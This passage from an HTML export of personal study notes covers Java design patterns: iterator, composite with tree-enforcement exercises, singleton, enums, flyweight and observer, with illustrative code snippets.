}</code></pre></details></li></ul><ul id="cce2ab0a-7af0-4cf1-bf9c-ab0a0af85c28" class="toggle"><li><details><summary>External Iterator Pattern</summary><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="3050dc19-d261-4ea5-a06b-1e6868676cf5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">use an external object to keep track of the iteration through an object that has data we want to extract</div></figure><h3 id="03277dd3-f8fe-4dd7-8a04-80ec141d8b76" class="">Iterator &amp; Iterable</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4a59a874-ed12-4686-812f-c1fb73755017" class="code"><code class="language-Java">interface Itterator&lt;T&gt; {
		boolean hasNext();
		T next();
}

interface Iterable&lt;T&gt; {
		Iterator&lt;T&gt; iterator();
}

interface List&lt;T&gt; extends Iterable&lt;T&gt;{}

class ArrayList&lt;T&gt; implements List&lt;T&gt;{}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="123fca91-a75c-4322-bbd5-16ddebc1ad21" class="code"><code class="language-Java">List&lt;T&gt; l;
Iterator&lt;T&gt; it = l.iterator();

while(it.hasNext()){
		T elem = i.next();
		//do stuff here
}</code></pre><p id="6f6e0c24-625c-457e-b5b9-2fc917fb35ef" class="">
</p><p id="00601edd-4b9c-47a8-a756-d1dd0b88d1ee" class="">
</p></details></li></ul><ul id="09b98aa2-56ea-4052-b188-5e9cfbe2492c" class="toggle"><li><details><summary>Composite Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="77e9a592-02cb-4bdb-86cb-aaf152aae1d8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><mark class="highlight-yellow_background">objects inside objects</mark> of the same type hierarchy to represent recursive shape<ul id="3dabd7e6-4e84-4371-a7b9-9ee76157500f" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">component </mark>is the parent type, with an abstract method</li></ul><ul id="e37388be-a2d0-4e0c-8c57-cf2f9d447ef4" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">leaf </mark>a subtype</li></ul><ul id="16479914-9424-4ea0-9202-b37042748013" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">composite </mark>is a subtype containing a list of components</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c9611dc0-7552-4fcc-b7a4-1eb4a6417e64" class="code"><code class="language-Java">//component
interface Expr{
		int operation();
}

//leaf
record Literal(int operation) implements Expr{} 

//composite
class Add implements Expr{ 
		List&lt;Expr&gt; children = new ArrayList&lt;&gt;();
		public int operation() {
				return children.stream().reduce(0, (x,y)-&gt;x+y);
		}
}

Expr a = new Literal();
Expr b = new Literal();
Expr adder = new Add();
adder.add(a);
adder.add(b);
adder.operation();</code></pre><ul id="69664ac2-62e2-4281-96bb-1f3ff0a291de" class="bulleted-list"><li style="list-style-type:disc">recursive shape is when apart of your data structure looks like the whole data structure </li></ul></div></figure><h1 id="60339715-df11-4bbb-9ca8-b53eceef3f86" class="">Enforcing Tree Structure</h1><p id="efd6119a-da19-4118-a274-44ced95d2ef1" class=""><mark class="highlight-blue_background">composites must be a tree</mark>. forming a graph or DAG cause stack overflows or unnecessary exponential computation due to aliasing.</p><figure id="7b6c68d5-947d-4406-a034-1e27c5881ffa" class="image"><a href="Untitled%201.png"><img style="width:288px" src="Untitled%201.png"/></a></figure><h3 id="80bc7e5d-b4d1-40bd-ba0b-db0b1441b668" class="">Enforce Tree by Error</h3><p id="4b2c96a1-66a5-4534-96d6-eb7061169bc5" class=""><mark class="highlight-blue_background">throw an error</mark> when trying to add a component which is <mark class="highlight-blue_background">already owned</mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7b46df19-d61f-4d6b-a162-a2aeaa5a3219" class="code"><code class="language-Java">class OwnedError extends Error{
  OwnedError(){super(&quot;An owner has been set already&quot;);}
  private static final long serialVersionUID = 1L;
 }
  
//top level component type must be an abstract class to ...
//store state (is owned field)
abstract class Exp{
  private boolean isOwned=false;
  public void setOwned(){
    if(isOwned) 
	    throw new OwnedError();
    isOwned=true;
    }
  abstract String toS();
}
class Lit extends Exp{
  final int val; Lit(int val){ this.val=val; }
  public String toS(){return &quot;&quot;+val;} 
}

class Add extends Exp{
    Exp l;
    Exp r;
    public Add(Exp l, Exp r){
        this.l = l;
        l.setOwned();
        this.r = r;
        r.setOwned();
    }
    public String toS(){return &quot;&quot;;} 
}

public class Exercise {
  static void example1(){
    Exp a=new Lit(12);
    Exp b=new Lit(5);
    new Add(a,b);//this should work
  }
  static void example2(){
    Exp a=new Lit(12);
    Exp b=new Lit(12);
    new Add(a,b);//this should work
  }
  static void example3(){
    Exp a=new Lit(12);
    new Add(a,a);//this should fail
  }
  static void example4(){
    Exp a=new Lit(1);
    Exp b=new Lit(2);
    Exp ab=new Add(a,b);
    new Add(ab,ab);//this should fail
  }
  static void example5(){
    Exp a=new Lit(1);
    Exp b=new Lit(2);
    Exp ab=new Add(a,b);
    new Add(ab,b);//this should fail too
  }

  public static void main(String[]a) {
    example1();
    example2();
    try{example3(); assert false:&quot;example3 passed&quot;;}
    catch(OwnedError oe){}
    try{example4(); assert false:&quot;example4 passed&quot;;}
    catch(OwnedError oe){}
    try{example5(); assert false:&quot;example5 passed&quot;;}
    catch(OwnedError oe){}
  }
}
        </code></pre><h3 id="806a06df-ff27-4de4-a3fe-1f105e066953" class="">Enforce Tree by mutation</h3><p id="19d82301-3af4-4e0a-a6e5-5a07599e7931" class="">verify that the Graph of components is indeed a Tree, not by throwing errors but <mark class="highlight-blue_background">by removing a parent when the new parent is set</mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="267a323a-9c2f-4778-97cc-5734a0bb8cda" class="code"><code class="language-Java">class UnremovableChildError extends Error{}
abstract class Exp{
...
static abstract class HasChild extends Exp implements Owner{
private final List&lt;Exp&gt; childs= new ArrayList&lt;&gt;();
public List&lt;Exp&gt; childs(){ return Collections.unmodifiableList(childs); }
public void remove(Exp exp){
Owner.super.remove(exp);
var changed= childs.remove(exp);
assert changed;
}
public void addChild(Exp child){//Solution HERE!
//if (child.owner == this){ return; }
for (Owner o= this; o instanceof Exp e; o = e.owner){
if (o == child){ throw new UnremovableChildError(); }
}
child.owner.remove(child);
assert child.owner == Exp.root;//redundant? more readable?
child.owner = this;
this.childs.add(child);
}
abstract String toS();
}
</code></pre><h1 id="db761fc0-7017-4ad6-a515-44f861413b25" class="">HTML Example</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d3327568-9219-4d72-b9f5-47e130fa6fd0" class="code"><code class="language-Java">interface Node{ String toHTML(); }

record P(String text) implements Node{
 public String toHTML(){ return &quot;&lt;P&gt;&quot; + text + &quot;&lt;/P&gt;&quot;; }
}
record Div(List&lt;Node&gt; ns) implements Node{
 public String toHTML(){
 return ns.stream()
 .map(Node::toHTML)
 .collect(Collectors.joining(&quot;\n&quot;,&quot;&lt;DIV&gt;\n&quot;,&quot;\n&lt;/DIV&gt;&quot;));
 }
}
record A(String href, String text) implements Node{
 public String toHTML(){ return &quot;&lt;A href=\&quot;&quot; + href + &quot;\&quot;&gt;&quot; + text + &quot;&lt;/A&gt;&quot;; }
}
record Ul(List&lt;Li&gt; lis) implements Node{
 public String toHTML(){
 return lis.stream()
 .map(Li::toHTML)
 .collect(Collectors.joining(&quot;\n&quot;, &quot;&lt;UL&gt;\n&quot;, &quot;\n&lt;/UL&gt;&quot;));
 }
}
record Li(Node node) implements Node{
 public String toHTML(){ return &quot;&lt;LI&gt;&quot; + node.toHTML() + &quot;&lt;/LI&gt;&quot;; }
}

//more operations

interface Node{ op1(); op2(); op3(); }
record P(String text) implements Node{
 op1(){..} op2(){..} op3(){..}
}
record Div(List&lt;Node&gt; ns) implements Node{
 op1(){..} op2(){..} op3(){..}
}
record A(String href, String text) implements Node{
 op1(){..} op2(){..} op3(){..}
}
record Ul(List&lt;Li&gt; lis) implements Node{
 op1(){..} op2(){..} op3(){..}
}
record Li(Node node) implements Node{
 op1(){..} op2(){..} op3(){..}
}
...
record MyTag(..) implements Node{
 op1(){..} op2(){..} op3(){..}
}

/**
With the composite we can have many
operations (op1, op2, op3) and many
data variants (P, Div, A, ...)
To add data variants we do not need
to modify existing code. Sometimes
we will call operations where there
is no need to modify existing code
&#x27;easy operations&#x27;. But what we mean
is: it is a &#x27;modular operation&#x27;!
It can be done without having
control of the existing code, thus
the existing code could even be in
a library!
Instead, to add operations, we
would need to implement that
operation inside of all the
existing data variant.
Thus we would need control of all
that code.
*/</code></pre><p id="4fde09ee-0c0a-4406-bc03-2567080226d0" class="">
</p><p id="f34852a8-a876-4adb-9f95-37bd00fb7dd7" class="">
</p></details></li></ul><ul id="a5f7851e-2ea7-48fe-a944-e5cf600f395c" class="toggle"><li><details><summary>Singleton Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="5d093163-e02c-4430-a268-c1ec221c743e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">minimizes memory consumption by staticly <mark class="highlight-yellow_background">storing objects of the same shape and just returning the pointer to them</mark> instead of creating a lot of structurally identical objects<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="38adcf5b-1d01-4004-beb5-10902346d5dc" class="code"><code class="language-Java">class Singleton {
		private static Singleton instance = new Singleton();
		private Singleton() {}
		public static Singleton instance() { return instance; }
		public void someMethod() { /*..*/ }
}</code></pre><ul id="3a087840-8427-4da4-b173-ec44710dbd24" class="bulleted-list"><li style="list-style-type:disc">remember that fields in interfaces are final static by default, can be used to store singletons without those keywords</li></ul><ul id="e8b45e92-583a-4696-8d06-33e6b41b264c" class="bulleted-list"><li style="list-style-type:disc">lambda that don’t capture local variables are optimized by java to singletons under the hood!</li></ul></div></figure><h3 id="45e51bfd-0e29-459f-813b-c9d9d5d4c061" class="">Empty List Singleton </h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="13a927dd-273f-42bd-99b2-6c52b2406ec2" class="code"><code class="language-Java">var a = List.of();
var b = List.of();
assert a == b; //pointer equality
//meaning they share the same memory
//Same for Set.of(), Map.of() etc.</code></pre><h3 id="c59cb639-e62e-47c7-a188-98b08add2b4a" class="">Singleton for Shared State</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ffc99e10-9101-4c42-adb3-75d02fa086b5" class="code"><code class="language-Java">interface Logger{
	 void add(String event);
	 String get();
}

enum BaseLogger implements Logger{
	 Instance;
	 private ArrayList&lt;String&gt; events= new ArrayList&lt;&gt;();
	 public void add(String event){ events.add(event); }
	 public String get() { return events.toString(); }
}</code></pre></details></li></ul><ul id="b5413c3f-2df8-41c7-9fed-8ac1acbc492e" class="toggle"><li><details><summary>Java Enums</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="dcd7bb65-0f9a-4ca3-934a-b806946f3d03"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">enums in java are a generalized singleton pattern<ul id="e084b1f3-28b9-4b8e-bbed-b436ff60804f" class="bulleted-list"><li style="list-style-type:disc">symbolic constants are singletons</li></ul><ul id="7387c01f-4c91-4a6a-90b7-87c973732c90" class="bulleted-list"><li style="list-style-type:disc">enums can have constructors, fields and methods</li></ul><ul id="d0fe034c-53da-46f1-98a5-494448d8501c" class="bulleted-list"><li style="list-style-type:disc">cannot all new outside of the enum class</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d08e4f81-4fa4-4f52-9e7b-f9674da73063" class="code"><code class="language-Java">enum Planet {
		//symbloic constants (identifiers don&#x27;t have to be all upper cases)
		Mercury (3.303e+23, 2.4397e6),
		Venus (4.869e+24, 6.0518e6),
		Earth (5.976e+24, 6.37814e6),
		Mars (6.421e+23, 3.3972e6),
		Jupiter (1.9e+27, 7.1492e7),
		Saturn (5.688e+26, 6.0268e7),
		Uranus (8.686e+25, 2.5559e7),
		Neptune (1.024e+26, 2.4746e7);
		
		//fields
		private final double mass; // in kilograms
		private final double radius; // in meters
		
		//constructor
		Planet(double mass, double radius) {
				this.mass = mass; this.radius = radius; 
		}
		
		//methods
		double mass() { return mass; }
		double radius() { return radius; }
		
		public static final double G = 6.67300E-11;
		
		double surfaceGravity() { return G * mass / (radius * radius); }
		
		double surfaceWeight(double otherMass) {
		return otherMass * surfaceGravity();
		}
}</code></pre></div></figure><h3 id="f4d9d865-145c-4e54-8032-fe95c576c74d" class="">Enum + Composites</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3a2783be-22dc-4de8-b195-9ded720d7e40" class="code"><code class="language-Java">enum Direction{
		North(West,East), //Compile time error here.
		East(North,South), //Can not use West before is defined
		
		North,
		East,
		South,
		West;
		
		private Direction left;
		private Direction right;
		
		public Direction left() { return left; }
		public Direction right() { return right; }
		
		private void set(Direction left, Direction right){
				this.left= left; 
				this.right= right;
		}
		
		static { //does happen after all constants are initialized
				North.set(West,East);
				East.set(North,South);
				South.set(East,West);
				West.set(South,North);
		}
}</code></pre><h3 id="09beb1e2-eacb-4d98-bbea-c18874a98441" class="">Enum + Dynamic Dispatch</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3bbea5f0-24ec-456c-a5fc-fc6758205c72" class="code"><code class="language-Java">//each symbolic constant needs to implement apply method inherited from 
//bifunction
enum Operation implements BiFunction&lt;Double,Double,Double&gt; {
		Plus {
				public Double apply(Double x, Double y) { return x + y; }
				public String toString() { return &quot;+&quot;; }
		},
		Minus {
				public Double apply(Double x, Double y) { return x - y; }
				public String toString() { return &quot;-&quot;; }
		},
		Times {
				public Double apply(Double x, Double y) { return x * y; }
				public String toString() { return &quot;*&quot;; }
		},
		Divide {
				public Double apply(Double x, Double y) {
				if (y == 0) { throw new ArithmeticException(); }
				return x / y;
		}
		
		public String toString() { return &quot;/&quot;; }
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4fc0c192-ec76-4697-b9aa-7b48e23a8572" class="code"><code class="language-Java">enum Name {
		//First part (before the &#x27;;&#x27;) is special to enums
		A,//No-args constructor, no override
		B { public void op1() { .. } },//No-args constructor, but override
		C(10),//explicit constructor call, no override
		D(10){ public void op1() { .. } };//explicit constructor call + override
		//This the end of the &#x27;special enum part&#x27;: we used &#x27;;&#x27; instead of &#x27;,&#x27;
		//Second part (after the &#x27;;&#x27;) is just like any abstract class
		FieldType anyFieldDeclaration;
		Name(int parName){..}//Any constructors as usual
		Name(){..}
		public void op1() { .. }//Any method as usual
		//Can also be abstract
}

//enums after the first ; are just abstract classes
//your symbolic constants are just objects that implements that abstract class</code></pre></details></li></ul><ul id="748eec56-2e51-4fde-9711-094b5607f837" class="toggle"><li><details><summary>Flyweight Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="bbf02e2a-e405-42f4-9426-2109f8e78199"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">if two objects are structurally equivalent, then they are the same object!<ul id="cfc64741-ce48-4336-a160-cbf8420b2469" class="bulleted-list"><li style="list-style-type:disc">object constructor is slower</li></ul><ul id="d51a0173-4ee7-48d1-99e7-124f23d8e1e6" class="bulleted-list"><li style="list-style-type:disc">memory saving</li></ul><ul id="88efd630-f4e2-4189-a702-7cef6222d51b" class="bulleted-list"><li style="list-style-type:disc">fastest equals/hash code methods (because they use pointer equality)</li></ul><ul id="83d9e835-e167-4225-ab63-79487b780506" class="bulleted-list"><li style="list-style-type:disc">great to use them for other caching/memorization </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="02997032-be86-4ade-9646-ed2f47f47c2c" class="code"><code class="language-Java">//if a person has the same name and same age, they are the same
//object
class Person{
	//private key type that stores the name and age state
	private record PersonKey(String name, int age){}
	//unchangable inner that is an instance of the key
	private final PersonKey inner;
	
	//private constructor the class handles to instanciate a person 
	//object
	private Person(PersonKey p){
			inner= p;
	}
	
	//getter methods that give you the values from the inner class&#x27;s 
	//state
	public String name(){return inner.name;}
	public int age(){return inner.age;}
	public String toString(){ return &quot;Person[&quot;+name()+&quot;,&quot;+age()+&quot;]&quot;; }
	
	//Person.of method for the user to create a person object
	//factory method pattern!!!
	static Person of(String name, int age){
			//invariant
			assert name != null &amp;&amp; !name.isEmpty() &amp;&amp; age &gt;= 0; 
			var key= new PersonKey(name,age); //make key
			//check key in cache and return the cached object or create t
			//new one.
			return cache.computeIfAbsent(key,Person::new); 
	}
	
	//cache to keep track of all currently existing Person objects
	private static final Map&lt;PersonKey,Person&gt; cache= new HashMap&lt;&gt;();
}

//usage
Person p1= Person.of(&quot;Alice&quot;, 30);
Person p2= Person.of(&quot;Alice&quot;, 30);
Person p3= Person.of(&quot;Bob&quot;, 25);
assert p1 == p2; //pointer equality here!
assert p1 != p3;
System.out.println(p1); //Output: Person[Alice, 30]
System.out.println(p2); //Output: Person[Alice, 30]
System.out.println(p3); //Output: Person[Bob, 25] </code></pre></div></figure><p id="7068c0c3-566c-460c-bab8-b44e3a465360" class="">
</p></details></li></ul><ul id="4e4ff716-1fcc-4bb2-8232-2edeeffe8269" class="toggle"><li><details><summary>Observer Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="04db4f3d-267d-4bd7-b52b-8be75720c8e7"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">subject object causes an event, observer object listens and responds to that event<ul id="9ad5e233-03b0-4abc-97bd-8b58e25fed23" class="bulleted-list"><li style="list-style-type:disc">loose coupling: subject &amp; observer interface knows about each other, concrete subtypes don’t</li></ul><ul id="3861b58b-7d55-417c-9d3a-4894bbc97d21" class="bulleted-list"><li style="list-style-type:disc">subject interface stores a/multiple observer interfaces</li></ul><figure id="aaa83aa0-1333-427f-bc04-edd22d3ff591" class="image"><a href="Untitled%202.png"><img style="width:562px" src="Untitled%202.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f159a000-bb34-4094-b858-48c37e194a96" class="code"><code class="language-Java">interface Observer{ 
	void update();
}

abstract class Subject{
 private Optional&lt;Observer&gt; ob = Optional.empty();
 final protected void onChange(){ ob.ifPresent( o-&gt;o.update() ); }
 final public void attach(Observer o){ ob = Optional.of(o); }
 final public void deattach(){ ob = Optional.empty(); }
}

class Bob extends Subject{
		int weight= 75;
		void eat(int weight){
				this.weight += weight;
				//we just call abstract method on change and the observer 
				//handles the implementation
				onChange();
		}
 }
</code></pre><ul id="d5c2f1ea-98e6-4067-9e10-dd3a708c65c0" class="bulleted-list"><li style="list-style-type:disc">observers stored in subjects should be private</li></ul><ul id="b73977b7-5455-4e79-9b5f-66c685d394bf" class="bulleted-list"><li style="list-style-type:disc">methods of subject interface must be final, so concrete types can’t override them</li></ul></div></figure><h3 id="a5fa9dde-a136-4c2b-8725-5114c4fce95f" class="">Runnable </h3><p id="6092db0f-05a3-47ab-8c3b-e699f2cecd08" class="">we can use Runnable objects from the java standard library instead of defining an observer interface and concrete types</p><ul id="b630152e-989d-46db-b6d5-af7c6625c137" class="bulleted-list"><li style="list-style-type:disc">runnable = observer</li></ul><ul id="02c5b166-8857-4424-8606-5791ec1a7aee" class="bulleted-list"><li style="list-style-type:disc">runnable.run() = observer.update()</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f2c6d3b6-2d6a-4a63-9ce7-173657fe4b73" class="code"><code class="language-Java">abstract class Subject{
 public Optional&lt;Runnable&gt; ob= Optional.empty();
 public void onChange(){ ob.ifPresent( o-&gt;o.run() ); }
 public void attach(Runnable o){ ob= Optional.of(o); }
}
class Bob extends Subject{
 int weight= 75;
 void eat(int weight){
		 this.weight += weight;
		 onChange();
